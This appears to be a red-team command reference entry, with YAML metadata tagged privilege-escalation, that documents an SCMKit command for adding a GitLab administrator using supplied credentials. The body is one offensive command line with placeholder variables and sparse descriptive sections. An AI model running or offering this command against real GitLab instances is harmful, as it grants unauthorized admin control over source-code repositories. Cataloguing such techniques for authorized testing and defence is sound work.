---
id: e6766745-d912-4873-b915-27e3dfb3f9b0
name: scmkit-add-gitlab-admin-username-password
type: command
executor: bash
data: >-
  SCMKit.exe -s gitlab -m addadmin -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o
  $_TARGET_USERNAME
output: null
created_at: '2023-04-06T03:56:25.112804+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - privilege-escalation
verified: true
validated: true
---

# scmkit-add-gitlab-admin-username-password

## Command

```bash
SCMKit.exe -s gitlab -m addadmin -c $_USERNAME:$_PASSWORD -u $_GITLAB_URL -o $_TARGET_USERNAME
```

## Description

Adds admin with credentials.

## Parameters

Similar to API key.

## Examples

Basic usage.

## Expected Output

Promotion confirmation.

## Related

- [[procedures/GitLab-Repository-Enumeration-and-Search]]
